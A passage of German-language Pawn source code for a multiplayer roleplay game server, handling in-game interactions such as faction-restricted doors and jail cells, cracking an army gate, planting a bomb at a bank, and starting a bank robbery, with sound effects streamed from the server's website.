					        PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/sirene.mp3",4579.2930,-8681.4688,4.5018,400.0, 1);
						}
						if(SpielerInfo[playerid][ufBombe] == 0)
				        {
				        	SpielerInfo[playerid][ufBombe] = 1;
				        	Missionenaktu(playerid);
				        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Armybase einbruch {0080FF}(/missionen)");
                            new Float:belohnung;
			            	belohnung = 800;
			            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
							GebeGeld(playerid,belohnung);
						}
						bombenklauen = 1;
					}
					else{SendClientMessage(playerid,COLOR_RED,"Es sind zu wenig Polizisten online!");}
				}else{SendClientMessage(playerid,COLOR_RED,"Als Staatsdiener kannst du keine Bombe klauen!");}
		    }else{SendClientMessage(playerid,COLOR_RED,"Die Bombe kann noch nicht geklaut werden!");}
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,1589.5266,-8550.5176,2.3310))//ls
		{
		    CancelSelectTextDraw(playerid);
		    new cops = 0,bomb = 0;
			if(Banktimer2 == 0)
			{
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1 && (IstSpielerInFrak(i,1) || IstSpielerInFrak(i,2)|| IstSpielerInFrak(i,15)))
				    {
				        cops++;
				        if(cops == 2) break;
				    }
				}
				if(cops > 1)
				{
					for(new x = 0; x < sizeof(SpielerInventar[]); x++)
					{
					    if(SpielerInventar[playerid][x][0] == 29)
					    {
					        Bombenplatz[playerid] = 2;
					        ShowPlayerDialog(playerid,DIALOG_BOMBSETZ,DIALOG_STYLE_MSGBOX,"Bombelegen","Möchtest du wirklich die Bombe setzen?","Ja","Nein");
					        bomb++;
					    }
					}
					if(bomb == 0)
					{
					    SendClientMessage(playerid,COLOR_RED,"Ohne Bombe ist das leider nicht möglich...");
					}
				}
				else SendClientMessage(playerid,COLOR_RED,"Es sind nicht genug Polizisten online!");
			}
            else SendClientMessage(playerid,COLOR_RED,"Die Banktür kann noch nicht gesprengt werden!");
		}
		else if(IsPlayerInRangeOfPoint(playerid,0.5,4348.9067,-8818.1357,4.3779))//armygate ausen
		{
		    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15))
		    {
		        if(armytorspam[playerid] == 0)
		        {
		            armytorspam[playerid]++;
		            SetTimerEx("armytorsp", 5000, false, "i", playerid);
					new rand = random(7),string[60];
					if(rand == 1)
					{
						format(string, sizeof(string), "%s versucht das Tor zu knacken", PlayerName(playerid));
						SendRadiusMessage(playerid,20.0,string,COLOR_PURPLE);
						MoveObject(armyhacktor,4345.9985, -8816.2783, 5.9900,0.1,-84.0000, 0.0000, 0.0000);
						SetTimer("Armytorzu",20000,0);
						SendClientMessage(playerid,COLOR_GREEN,"Tor geknackt!");
						FraktionsNachricht(1,COLOR_HQ,"Jemand versucht das Tor der Army zu knacken");
						FraktionsNachricht(2,COLOR_HQ,"Jemand versucht das Tor der Army zu knacken");
						FraktionsNachricht(15,COLOR_HQ,"Jemand versucht das Tor der Army zu knacken");
					}
					else
					{
						format(string, sizeof(string), "%s versucht das Tor zu knacken", PlayerName(playerid));
						SendRadiusMessage(playerid,20.0,string,COLOR_PURPLE);
						FraktionsNachricht(1,COLOR_HQ,"Jemand versucht das Tor der Army zu knacken");
						FraktionsNachricht(2,COLOR_HQ,"Jemand versucht das Tor der Army zu knacken");
						FraktionsNachricht(15,COLOR_HQ,"Jemand versucht das Tor der Army zu knacken");
					}
				}else{SendClientMessage(playerid,COLOR_RED,"Du kannst den Befehl nur jede 5 Sekunden benutzen!");}
			}
			else
			{
				MoveObject(armyhacktor,4345.9985, -8816.2783, 5.9900,0.1,-84.0000, 0.0000, 0.0000);
				SetTimer("Armytorzu",20000,0);
				SendClientMessage(playerid,COLOR_GREEN,"Tor geöffnet!");
			}
		}
		else if(IsPlayerInRangeOfPoint(playerid,0.5,4344.3853,-8805.6846,0.4863))//armygate innen
		{
			if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15))
		    {
				MoveObject(armyhacktor,4345.9985, -8816.2783, 5.9900,0.7,-84.0000, 0.0000, 0.0000);
				SetTimer("Armytorzu",20000,0);
				FraktionsNachricht(1,COLOR_HQ,"Der Innencode vom Armytor wurde verwendet");
				FraktionsNachricht(2,COLOR_HQ,"Der Innencode vom Armytor wurde verwendet");
				FraktionsNachricht(15,COLOR_HQ,"Der Innencode vom Armytor wurde verwendet");
				SendClientMessage(playerid,COLOR_GREEN,"Tor geöffnet!");
			}
			else
			{
				MoveObject(armyhacktor,4345.9985, -8816.2783, 5.9900,0.1,-84.0000, 0.0000, 0.0000);
				SetTimer("Armytorzu",20000,0);
				SendClientMessage(playerid,COLOR_GREEN,"Tor geöffnet!");
			}
		}

		else if(IsPlayerInRangeOfPoint(playerid,2,1760.2711, -9315.1689, 4.6494) && IstSpielerInFrak(playerid,3) || IsPlayerInRangeOfPoint(playerid,2,1760.2711, -9315.1689, 4.6494) && IstSpielerInFrak(playerid,4))
		{
		    if(LSMDDOOR[1] == 0)
		    {
		        LSMDDOOR[1] = 1;
		        GetDynamicObjectRot(LSMDDOORS[1],RX,RY,RZ);
		    	MoveObjektRot(LSMDDOORS[1],RX,RY,0.00000,9);//geöffnet

		    }
		    else
			{
		    	LSMDDOOR[1] = 0;
		    	GetDynamicObjectRot(LSMDDOORS[1],RX,RY,RZ);
		    	MoveObjektRot(LSMDDOORS[1],RX,RY,-90.00000,9);//geschlossen
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		//MEDICLS ENDE
		//FWTüren Anfang
		else if(IsPlayerInRangeOfPoint(playerid,2,1771.95203, -9365.70508, 4.65540) && IstSpielerInFrak(playerid,4) || IsPlayerInRangeOfPoint(playerid,2,1771.95203, -9365.70508, 4.65540) && IstSpielerInFrak(playerid,3))
		{
		    if(LSFDDOOR[0] == 0)
		    {
		        LSFDDOOR[0] = 1;
		        GetDynamicObjectRot(LSFDDOORS[0],RX,RY,RZ);
		    	MoveObjektRot(LSFDDOORS[0],RX,RY,180.00000,9);

		    }
		    else
			{
		    	LSFDDOOR[0] = 0;
		    	GetDynamicObjectRot(LSFDDOORS[0],RX,RY,RZ);
		    	MoveObjektRot(LSFDDOORS[0],RX,RY,90.00000,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,2,1754.57520, -9327.43164, 4.65540) && IstSpielerInFrak(playerid,4) || IsPlayerInRangeOfPoint(playerid,2,1754.57520, -9327.43164, 4.65540) && IstSpielerInFrak(playerid,3))
		{
		    if(LSFDDOOR[1] == 0)
		    {
		        LSFDDOOR[1] = 1;
		        GetDynamicObjectRot(LSFDDOORS[1],RX,RY,RZ);
		    	MoveObjektRot(LSFDDOORS[1],RX,RY,180.00000,9);

		    }
		    else
			{
		    	LSFDDOOR[1] = 0;
		    	GetDynamicObjectRot(LSFDDOORS[1],RX,RY,RZ);
		    	MoveObjektRot(LSFDDOORS[1],RX,RY,90.00000,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		//FWTÜREN Ende
		//pdtüren anfang
		else if(IsPlayerInRangeOfPoint(playerid,2,1564.23975, -9499.00488, 7.40710) && IstSpielerInFrak(playerid,1))
		{
		    if(PDTUER[0] == 0)
		    {
		        PDTUER[0] = 1;
		        GetDynamicObjectRot(LSDOOR[0],RX,RY,RZ);
		    	MoveObjektRot(LSDOOR[0],RX,RY,90.00000,9);

		    }
		    else
			{
		    	PDTUER[0] = 0;
		    	GetDynamicObjectRot(LSDOOR[0],RX,RY,RZ);
		    	MoveObjektRot(LSDOOR[0],RX,RY,0.00000,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,2,1561.03296, -9499.00195, 7.40710) && IstSpielerInFrak(playerid,1))
		{
		    if(PDTUER[1] == 0)
		    {
		        PDTUER[1] = 1;
		        GetDynamicObjectRot(LSDOOR[1],RX,RY,RZ);
		    	MoveObjektRot(LSDOOR[1],RX,RY,90.00000,9);

		    }
		    else
			{
		    	PDTUER[1] = 0;
		    	GetDynamicObjectRot(LSDOOR[1],RX,RY,RZ);
		    	MoveObjektRot(LSDOOR[1],RX,RY,0.00000,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,2,1548.16345, -9518.03027, 7.40710) && IstSpielerInFrak(playerid,1))
		{
		    if(PDTUER[2] == 0)
		    {
		        PDTUER[2] = 1;
		        GetDynamicObjectRot(LSDOOR[2],RX,RY,RZ);
		    	MoveObjektRot(LSDOOR[2],RX,RY,90.00000,9);

		    }
		    else
			{
		    	PDTUER[2] = 0;
		    	GetDynamicObjectRot(LSDOOR[2],RX,RY,RZ);
		    	MoveObjektRot(LSDOOR[2],RX,RY,0.00000,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,2,1553.17407, -9476.69043, 7.40710) && IstSpielerInFrak(playerid,1))
		{
		    if(PDTUER[3] == 0)
		    {
		        PDTUER[3] = 1;
		        GetDynamicObjectRot(LSDOOR[3],RX,RY,RZ);
		    	MoveObjektRot(LSDOOR[3],RX,RY,-90.00000,9);

		    }
		    else
			{
		    	PDTUER[3] = 0;
		    	GetDynamicObjectRot(LSDOOR[3],RX,RY,RZ);
		    	MoveObjektRot(LSDOOR[3],RX,RY,0.00000,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,2,1545.06555, -9520.18066, 7.40710) && IstSpielerInFrak(playerid,1))
		{
		    if(PDTUER[4] == 0)
		    {
		        PDTUER[4] = 1;
		        GetDynamicObjectRot(LSDOOR[4],RX,RY,RZ);
		    	MoveObjektRot(LSDOOR[4],RX,RY,180.00000,9);

		    }
		    else
			{
		    	PDTUER[4] = 0;
		    	GetDynamicObjectRot(LSDOOR[4],RX,RY,RZ);
		    	MoveObjektRot(LSDOOR[4],RX,RY,90.00000,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		//pdtüren ende
		else if(IsPlayerInRangeOfPoint(playerid,2,1558.7615,-9499.4316,7.1537))
		{
		    ShowPlayerDialog(playerid,DIALOG_PD4,DIALOG_STYLE_LIST,"Police Department","Klingeln\nWaffenschein erwerben -600$","Anwenden","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,2,6502.8633,-7872.8179,4.6186))
		{
		    ShowPlayerDialog(playerid,DIALOG_PD5,DIALOG_STYLE_LIST,"Police Department","Klingeln\nWaffenschein erwerben -600$","Anwenden","Abbrechen");
		}
		//pdzellen
		else if(IsPlayerInRangeOfPoint(playerid,3,1563.81885, -9483.07617, 7.40330) && IstSpielerInFrak(playerid,1))
		{
		    if(PDZELLEOP[0] == 0)
		    {
		        PDZELLEOP[0] = 1;
		        MoveDynamicObject(PDZELLE[0],1565.5516, -9483.0783, 7.4033,2.0);
		        PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/prisondoor.mp3",1565.5516, -9483.0783, 7.4033,15.0, 1);
		    }
		    else
			{
		    	PDZELLEOP[0] = 0;
		    	MoveDynamicObject(PDZELLE[0],1563.81885, -9483.07617, 7.40330,2.0);
		    	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/prisondoor.mp3",1563.81885, -9483.07617, 7.40330,15.0, 1);
		    }
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,1560.14148, -9483.07617, 7.40330) && IstSpielerInFrak(playerid,1))
		{
		    if(PDZELLEOP[1] == 0)
		    {
		        PDZELLEOP[1] = 1;
		        MoveDynamicObject(PDZELLE[1],1561.8867, -9483.0758, 7.4033,2.0);
		        PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/prisondoor.mp3",1560.14148, -9483.07617, 7.40330,15.0, 1);
		    }
		    else
			{
		    	PDZELLEOP[1] = 0;
		    	MoveDynamicObject(PDZELLE[1],1560.14148, -9483.07617, 7.40330,2.0);
		    	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/prisondoor.mp3",1560.14148, -9483.07617, 7.40330,15.0, 1);
		    }
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,1556.46240, -9483.07422, 7.40330) && IstSpielerInFrak(playerid,1))
		{
		    if(PDZELLEOP[2] == 0)
		    {
		        PDZELLEOP[2] = 1;
		        MoveDynamicObject(PDZELLE[2],1558.2151, -9483.0781, 7.4033,2.0);
		        PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/prisondoor.mp3",1558.2151, -9483.0781, 7.4033,15.0, 1);
		    }
		    else
			{
		    	PDZELLEOP[2] = 0;
		    	MoveDynamicObject(PDZELLE[2],1556.46240, -9483.07422, 7.40330,2.0);
		    	PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/prisondoor.mp3",1556.46240, -9483.07422, 7.40330,15.0, 1);
		    }
		}
	    else if(IsPlayerInRangeOfPoint(playerid,3,6314.20361, -9365.45801, 4.65700) && SpielerInfo[playerid][uJob] == 5)
	    {
		    if(FWTUER1 == 0)
		    {
		    	GetDynamicObjectRot(FWTUER,RX2,RY2,RZ2);
		    	MoveObjektRot(FWTUER,RX2,RY2,RZ2+90,9);
		    	FWTUER1 = 1;
		    }
		    else
		    {
		    	GetDynamicObjectRot(FWTUER,RX2,RY2,RZ2);
		    	MoveObjektRot(FWTUER,RX2,RY2,RZ2-90,9);
		    	FWTUER1 = 0;
			}
	    }
	    //////////////////
	    //////////////////



     	else if(IsPlayerInRangeOfPoint(playerid,5,4503.48975, -8707.90137, 3.40910) && IstSpielerInFrak(playerid,15))
		{
		    if(ARMYDOOR1[3] == 0)
		    {
		    	GetDynamicObjectRot(ARMYDOOR[3],RX2,RY2,RZ2);
		    	MoveObjektRot(ARMYDOOR[3],RX2,RY2,RZ2+90,9);
		    	ARMYDOOR1[3] = 1;
		    }
		    else
		    {
		    	GetDynamicObjectRot(ARMYDOOR[3],RX2,RY2,RZ2);
		    	MoveObjektRot(ARMYDOOR[3],RX2,RY2,RZ2-90,9);
		    	ARMYDOOR1[3] = 0;
		    }
		}
	    else if(IsPlayerInRangeOfPoint(playerid,5,4533.02686, -8698.90918, 3.40910) && IstSpielerInFrak(playerid,15))
		{
		    if(ARMYDOOR1[2] == 0)
		    {
		    	GetDynamicObjectRot(ARMYDOOR[2],RX2,RY2,RZ2);
		    	MoveObjektRot(ARMYDOOR[2],RX2,RY2,RZ2-90,9);
		    	ARMYDOOR1[2] = 1;
		    }
		    else
		    {
		    	GetDynamicObjectRot(ARMYDOOR[2],RX2,RY2,RZ2);
		    	MoveObjektRot(ARMYDOOR[2],RX2,RY2,RZ2+90,9);
		    	ARMYDOOR1[2] = 0;
		    }
		}
   		else if(IsPlayerInRangeOfPoint(playerid,5,4541.05029, -8687.10352, 3.40910) && IstSpielerInFrak(playerid,15))
		{
		    if(ARMYDOOR1[1] == 0)
		    {
		    	GetDynamicObjectRot(ARMYDOOR[1],RX2,RY2,RZ2);
		    	MoveObjektRot(ARMYDOOR[1],RX2,RY2,RZ2+90,9);
		    	ARMYDOOR1[1] = 1;
		    }
		    else
		    {
		    	GetDynamicObjectRot(ARMYDOOR[1],RX2,RY2,RZ2);
		    	MoveObjektRot(ARMYDOOR[1],RX2,RY2,RZ2-90,9);
		    	ARMYDOOR1[1] = 0;
		    }
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,4547.50977, -8683.04590, 3.40910) && IstSpielerInFrak(playerid,15))
		{
		    if(ARMYDOOR1[0] == 0)
		    {
		    	GetDynamicObjectRot(ARMYDOOR[0],RX2,RY2,RZ2);
		    	MoveObjektRot(ARMYDOOR[0],RX2,RY2,RZ2-90,9);
		    	ARMYDOOR1[0] = 1;
		    }
		    else
		    {
		    	GetDynamicObjectRot(ARMYDOOR[0],RX2,RY2,RZ2);
		    	MoveObjektRot(ARMYDOOR[0],RX2,RY2,RZ2+90,9);
		    	ARMYDOOR1[0] = 0;
		    }
		}


		else if(IsPlayerInRangeOfPoint(playerid,3,6496.19287, -7875.83252, 4.85930) && IstSpielerInFrak(playerid,2))
		{
		    if(PDDOORO1 == 0)
		    {
		    	GetDynamicObjectRot(PDDOOR[0],RX2,RY2,RZ2);
		    	MoveObjektRot(PDDOOR[0],RX2,RY2,RZ2-90,9);
		    	PDDOORO1 = 1;
		    }
		    else
		    {
		    	GetDynamicObjectRot(PDDOOR[0],RX2,RY2,RZ2);
		    	MoveObjektRot(PDDOOR[0],RX2,RY2,RZ2+90,9);
		    	PDDOORO1 = 0;
		    }
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,6524.5425, -7883.8281, 4.8572) && IstSpielerInFrak(playerid,2))
		{
		    if(PDDOORO5 == 0)
		    {
		    	GetDynamicObjectRot(PDDOOR[4],RX2,RY2,RZ2);
		    	MoveObjektRot(PDDOOR[4],RX2,RY2,RZ2+90,9);
		    	PDDOORO5 = 1;
		    }
		    else
		    {
		    	GetDynamicObjectRot(PDDOOR[4],RX2,RY2,RZ2);
		    	MoveObjektRot(PDDOOR[4],RX2,RY2,RZ2-90,9);
		    	PDDOORO5 = 0;
		    }
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,6507.98242, -7875.89600, 3.60500) && IstSpielerInFrak(playerid,2))
		{
		    if(PDDOORO2 == 0)
		    {
		    	GetDynamicObjectRot(PDDOOR[1],RX2,RY2,RZ2);
		    	MoveObjektRot(PDDOOR[1],RX2,RY2,RZ2-90,9);
		    	PDDOORO2 = 1;
		    }
		    else
		    {
		    	GetDynamicObjectRot(PDDOOR[1],RX2,RY2,RZ2);
		    	MoveObjektRot(PDDOOR[1],RX2,RY2,RZ2+90,9);
		    	PDDOORO2 = 0;
		    }
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,6521.82471, -7880.61230, 3.60500) && IstSpielerInFrak(playerid,2))
		{
		    if(PDDOORO3 == 0)
		    {
		    	GetDynamicObjectRot(PDDOOR[2],RX2,RY2,RZ2);
		    	MoveObjektRot(PDDOOR[2],RX2,RY2,RZ2+90,9);
		    	PDDOORO3 = 1;
		    }
		    else
		    {
		    	GetDynamicObjectRot(PDDOOR[2],RX2,RY2,RZ2);
		    	MoveObjektRot(PDDOOR[2],RX2,RY2,RZ2-90,9);
		    	PDDOORO3 = 0;
		    }
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,6503.71777, -7887.83350, 3.60500) && IstSpielerInFrak(playerid,2))
		{
		    if(PDDOORO4 == 0)
		    {
		    	GetDynamicObjectRot(PDDOOR[3],RX2,RY2,RZ2);
		    	MoveObjektRot(PDDOOR[3],RX2,RY2,RZ2+90,9);
		    	PDDOORO4 = 1;
		    }
		    else
		    {
		    	GetDynamicObjectRot(PDDOOR[3],RX2,RY2,RZ2);
		    	MoveObjektRot(PDDOOR[3],RX2,RY2,RZ2-90,9);
		    	PDDOORO4 = 0;
		    }
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,6495.51611, -7887.85840, 4.86880) && IstSpielerInFrak(playerid,2))
		{
		    if(PDZELLEOP[3] == 0)
		    {
		        PDZELLEOP[3] = 1;
		        MoveDynamicObject(PDZELLE[3],6495.5167, -7889.6064, 4.8688,2.0);
		    }
		    else
			{
		    	PDZELLEOP[3] = 0;
		    	MoveDynamicObject(PDZELLE[3],6495.51611, -7887.85840, 4.86880,2.0);
		    }
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,6495.51611, -7884.18896, 4.86880) && IstSpielerInFrak(playerid,2))
		{
		    if(PDZELLEOP[4] == 0)
		    {
		        PDZELLEOP[4] = 1;
		        MoveDynamicObject(PDZELLE[4],6495.5173, -7885.9376, 4.8688,2.0);
		    }
		    else
			{
		    	PDZELLEOP[4] = 0;
		    	MoveDynamicObject(PDZELLE[4],6495.51611, -7884.18896, 4.86880,2.0);
		    }
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,1716.86597, -8839.92871, 4.19080) && IstSpielerInFrak(playerid,7))
		{
		    if(BALLASDOOR[0] == 0)
		    {
		        BALLASDOOR[0] = 1;
		        GetDynamicObjectRot(BALLASDOORS[0],RX,RY,RZ);
		    	MoveObjektRot(BALLASDOORS[0],RX,RY,258.0000,9);

		    }
		    else
			{
		    	BALLASDOOR[0] = 0;
		    	GetDynamicObjectRot(BALLASDOORS[0],RX,RY,RZ);
		    	MoveObjektRot(BALLASDOORS[0],RX,RY,180.00000,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4,6351.84619, -9127.93457, 6.49810) && IstSpielerInFrak(playerid,16))
		{
		    if(VAGOSDOORs[0] == 0)
		    {
		        VAGOSDOORs[0] = 1;
		        GetDynamicObjectRot(VAGOSDOOR[0],RX,RY,RZ);
		    	MoveObjektRot(VAGOSDOOR[0],RX,RY,0,9);

		    }
		    else
			{
		    	VAGOSDOORs[0] = 0;
		    	GetDynamicObjectRot(VAGOSDOOR[0],RX,RY,RZ);
		    	MoveObjektRot(VAGOSDOOR[0],RX,RY,-90,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4,6365.81738, -9129.92969, 6.49810) && IstSpielerInFrak(playerid,16))
		{
		    if(VAGOSDOORs[1] == 0)
		    {
		        VAGOSDOORs[1] = 1;
		        GetDynamicObjectRot(VAGOSDOOR[1],RX,RY,RZ);
		    	MoveObjektRot(VAGOSDOOR[1],RX,RY,0,9);

		    }
		    else
			{
		    	VAGOSDOORs[1] = 0;
		    	GetDynamicObjectRot(VAGOSDOOR[1],RX,RY,RZ);
		    	MoveObjektRot(VAGOSDOOR[1],RX,RY,-90,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4,3725.53125, -9330.16016, 8.73700) && IstSpielerInFrak(playerid,17))
		{
		    if(BIKERDOORs[0] == 0)
		    {
		        BIKERDOORs[0] = 1;
		        GetDynamicObjectRot(BIKERDOOR[0],RX,RY,RZ);
		    	MoveObjektRot(BIKERDOOR[0],RX,RY,90,9);

		    }
		    else
			{
		    	BIKERDOORs[0] = 0;
		    	GetDynamicObjectRot(BIKERDOOR[0],RX,RY,RZ);
		    	MoveObjektRot(BIKERDOOR[0],RX,RY,0,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,4,3728.66895, -9341.71191, 8.73700) && IstSpielerInFrak(playerid,17))
		{
		    if(BIKERDOORs[1] == 0)
		    {
		        BIKERDOORs[1] = 1;
		        GetDynamicObjectRot(BIKERDOOR[1],RX,RY,RZ);
		    	MoveObjektRot(BIKERDOOR[1],RX,RY,-90,9);

		    }
		    else
			{
		    	BIKERDOORs[1] = 0;
		    	GetDynamicObjectRot(BIKERDOOR[1],RX,RY,RZ);
		    	MoveObjektRot(BIKERDOOR[1],RX,RY,0,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,6370.76416, -9327.43164, 3.39850) && IstSpielerInFrak(playerid,10))
		{
		    if(LCNDOOR[0] == 0)
		    {
		        LCNDOOR[0] = 1;
		        GetDynamicObjectRot(LCNDOORS[0],RX,RY,RZ);
		    	MoveObjektRot(LCNDOORS[0],RX,RY,0.0000,9);

		    }
		    else
			{
		    	LCNDOOR[0] = 0;
		    	GetDynamicObjectRot(LCNDOORS[0],RX,RY,RZ);
		    	MoveObjektRot(LCNDOORS[0],RX,RY,-90.00000,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,4413.70361, -7623.80811, 7.43700) && IstSpielerInFrak(playerid,8))
		{
		    if(GROVEDOOR[0] == 0)
		    {
		        GROVEDOOR[0] = 1;
		        GetDynamicObjectRot(GROVEDOORS[0],RX,RY,RZ);
		    	MoveObjektRot(GROVEDOORS[0],RX,RY,0.0000,9);

		    }
		    else
			{
		    	GROVEDOOR[0] = 0;
		    	GetDynamicObjectRot(GROVEDOORS[0],RX,RY,RZ);
		    	MoveObjektRot(GROVEDOORS[0],RX,RY,90.00000,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,4223.10498, -7633.65186, 5.96790) && IstSpielerInFrak(playerid,9))
		{
		    if(ATZECASDOOR[0] == 0)
		    {
		        ATZECASDOOR[0] = 1;
		        GetDynamicObjectRot(ATZECASDOORS[0],RX,RY,RZ);
		    	MoveObjektRot(ATZECASDOORS[0],RX,RY,-90.0000,9);

		    }
		    else
			{
		    	ATZECASDOOR[0] = 0;
		    	GetDynamicObjectRot(ATZECASDOORS[0],RX,RY,RZ);
		    	MoveObjektRot(ATZECASDOORS[0],RX,RY,0.00000,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,4219.22119, -7644.98340, 5.95590) && IstSpielerInFrak(playerid,9))
		{
		    if(ATZECASDOOR[1] == 0)
		    {
		        ATZECASDOOR[1] = 1;
		        GetDynamicObjectRot(ATZECASDOORS[1],RX,RY,RZ);
		    	MoveObjektRot(ATZECASDOORS[1],RX,RY,0.0000,9);

		    }
		    else
			{
		    	ATZECASDOOR[1] = 0;
		    	GetDynamicObjectRot(ATZECASDOORS[1],RX,RY,RZ);
		    	MoveObjektRot(ATZECASDOORS[1],RX,RY,90.00000,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,1711.59790, -8851.22656, 4.19080) && IstSpielerInFrak(playerid,7))
		{
		    if(BALLASDOOR[1] == 0)
		    {
		        BALLASDOOR[1] = 1;
		        GetDynamicObjectRot(BALLASDOORS[1],RX,RY,RZ);
		    	MoveObjektRot(BALLASDOORS[1],RX,RY,0.0000,9);

		    }
		    else
			{
		    	BALLASDOOR[1] = 0;
		    	GetDynamicObjectRot(BALLASDOORS[1],RX,RY,RZ);
		    	MoveObjektRot(BALLASDOORS[1],RX,RY,90.00000,9);
		    }
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		//BALLASDOOR ENDE
		else if(IsPlayerInRangeOfPoint(playerid,3,6495.51611, -7891.53516, 4.86880) && IstSpielerInFrak(playerid,5))
		{
		    if(PDZELLEOP[5] == 0)
		    {
		        PDZELLEOP[5] = 1;
		        MoveDynamicObject(PDZELLE[5],6495.5178, -7893.2645, 4.8688,2.0);
		    }
		    else
			{
		    	PDZELLEOP[5] = 0;
		    	MoveDynamicObject(PDZELLE[5],6495.51611, -7891.53516, 4.86880,2.0);
		    }
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,1760.4562,-9193.4043,4.8379))
		{
		    ShowPlayerDialog(playerid,DIALOG_BURGER,DIALOG_STYLE_LIST,"Burger Shot","Ich möchte etwas essen\nWaren übergeben","Weiter","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,6592.4238,-7880.0522,4.4086))
		{
		    ShowPlayerDialog(playerid,DIALOG_PIZZA,DIALOG_STYLE_LIST,"Pizza laden","Ich möchte etwas essen\nWaren übergeben","Weiter","Abbrechen");
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,1696.4893,-9210.9063,4.4040))
		{
		    ShowPlayerDialog(playerid,DIALOG_DRUUG,DIALOG_STYLE_LIST,"Jonny bietet dir an:","Hotdog 3$\nSamen 28$","Kaufen","Nichts");
		}
       /**/
		//afterhaus:
		for(new o = 0; o < sizeof(Bankfach); o++)
		{
		    new Float:x,Float:y,Float:z;
		    GetDynamicObjectPos(Bankfach[o][0],x,y,z);
			if(IsPlayerInRangeOfPoint(playerid,2,x,y,z) && IsPlayerInArea(playerid,6419.9175,-7758.7349,6428.4980,-7746.1499) || IsPlayerInRangeOfPoint(playerid,2,x,y,z) && IsPlayerInArea(playerid,1581.8749,-8562.3311,1592.1423,-8551.1611))
			{
				new cops = 0;
			    for(new i = 0; i < MAX_PLAYERS; i++)
				{
				    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1 && (IstSpielerInFrak(i,1) || IstSpielerInFrak(i,2)|| IstSpielerInFrak(i,15)))
				    {
				        cops++;
				        if(cops == 2) break;
				    }
				}
				if(cops > 1)
				{
				    if(IstSpielerInFrak(playerid,1) || IstSpielerInFrak(playerid,2) || IstSpielerInFrak(playerid,3) || IstSpielerInFrak(playerid,4) || IstSpielerInFrak(playerid,5) || IstSpielerInFrak(playerid,6)|| IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du kannst die Bank nicht ausrauben, da du Staatsdiener bist!");
				    CancelSelectTextDraw(playerid);
				    if(Bankfach[o][1] == 0)
				    {
				        if(Bankraubtextdraw[playerid] == 0)
				        {
				            PlayerTextDrawShow(playerid,Bankklau[playerid][0]);
				            PlayerTextDrawShow(playerid,Bankklau[playerid][1]);
				            Bankraubtextdraw[playerid] = 1;
				            SendClientMessage(playerid,COLOR_YELLOW,"Das Geld landet im Rucksack! Sobald du 15 Minuten auf der Flucht warst, bekommst du es!");
